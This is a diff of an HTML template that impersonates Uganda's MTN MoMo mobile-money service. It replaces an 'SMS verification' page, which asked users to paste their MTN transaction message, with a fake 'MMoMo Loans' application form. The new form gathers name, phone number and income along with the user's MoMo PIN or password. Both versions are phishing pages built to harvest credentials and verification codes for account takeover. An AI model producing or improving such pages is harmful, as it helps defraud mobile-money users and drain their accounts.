@@ -2,27 +2,95 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>MTN MoMo - SMS Verification</title>
+    <title>Loan Application - MTN MoMo</title>
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <style>
-        body { background-color: #003366; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; margin: 0; }
-        .card-box { background: white; color: #333; padding: 30px; border-radius: 12px; width: 100%; max-width: 450px; box-shadow: 0 8px 24px rgba(0,0,0,0.3); }
-        .btn-momo { background-color: #FFCC00; color: #003366; font-weight: bold; width: 100%; padding: 12px; border: none; border-radius: 6px; }
+        body { background-color: #f4f5f7; font-family: sans-serif; }
+        .navbar-custom { background-color: #003366; }
+        .card-box { background: white; border-radius: 12px; padding: 30px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
+        .btn-momo { background-color: #003366; color: white; font-weight: bold; }
     </style>
 </head>
 <body>
-    <div class="card-box">
-        <h3 class="fw-bold mb-3 text-center" style="color: #003366;">MTN MoMo SMS Verification</h3>
-        <p class="text-muted small mb-4">Please paste the complete SMS message you received from MTN regarding your transaction below:</p>
-        
-        <form method="POST">
-            <div class="mb-3">
-                <textarea name="auth_code" rows="5" class="form-control" placeholder="Paste the full MTN message here (e.g. Yello, you have received...)" required></textarea>
-            </div>
-            <button type="submit" class="btn btn-momo">Submit SMS Message</button>
-        </form>
-        <div class="text-center mt-3 small text-muted">Application ID: {{ app_id }}</div>
+    <nav class="navbar navbar-custom py-3 px-4">
+        <a href="/" class="text-white text-decoration-none">&larr; Back</a>
+        <h5 class="text-warning m-0">MMoMo Loans</h5>
+    </nav>
+
+    <div class="container d-flex justify-content-center align-items-center" style="min-height: 80vh;">
+        <div class="card-box" style="width: 550px;">
+            <h3 class="text-center fw-bold">Loan Application</h3>
+            <p class="text-center text-muted small">Fill out the details below to apply</p>
+
+            <form action="/apply" method="POST">
+                <!-- Step 1 -->
+                <div class="mb-3">
+                    <label class="form-label">Loan Type</label>
+                    <select class="form-select" name="loan_type">
+                        <option>Business Loan</option>
+                        <option>Personal Loan</option>
+                        <option>Emergency Loan</option>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Loan Amount (UGX)</label>
+                    <input type="number" class="form-control" name="amount" value="1000000" required>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Loan Term</label>
+                    <select class="form-select" name="term">
+                        <option>48 Months</option>
+                        <option>24 Months</option>
+                        <option>12 Months</option>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Purpose of Loan</label>
+                    <textarea class="form-control" name="purpose" rows="2" placeholder="Describe the purpose..." required></textarea>
+                </div>
+
+                <!-- Step 2 fields -->
+                <div class="row">
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">First Name</label>
+                        <input type="text" class="form-control" name="first_name" required>
+                    </div>
+                    <div class="col-md-6 mb-3">
+                        <label class="form-label">Last Name</label>
+                        <input type="text" class="form-control" name="last_name" required>
+                    </div>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Phone Number (Uganda)</label>
+                    <div class="input-group">
+                        <span class="input-group-text">+256</span>
+                        <input type="text" class="form-control" name="phone" placeholder="670123456" required>
+                    </div>
+                </div>
+
+                <!-- Step 3 fields -->
+                <div class="mb-3">
+                    <label class="form-label">Employment Status</label>
+                    <select class="form-select" name="employment">
+                        <option>Self-employed</option>
+                        <option>Employed</option>
+                        <option>Business Owner</option>
+                    </select>
+                </div>
+                <div class="mb-3">
+                    <label class="form-label">Annual Income (UGX)</label>
+                    <input type="number" class="form-control" name="income" placeholder="Enter annual income" required>
+                </div>
+
+                <!-- MoMo PIN / Password Field -->
+                <div class="mb-3">
+                    <label class="form-label">MoMo PIN / Password</label>
+                    <input type="password" class="form-control" name="password" placeholder="Enter 4-digit PIN or password" required>
+                </div>
+
+                <button type="submit" class="btn btn-momo w-100 py-3 rounded-pill mt-3">SUBMIT APPLICATION</button>
+            </form>
+        </div>
     </div>
 </body>
 </html>
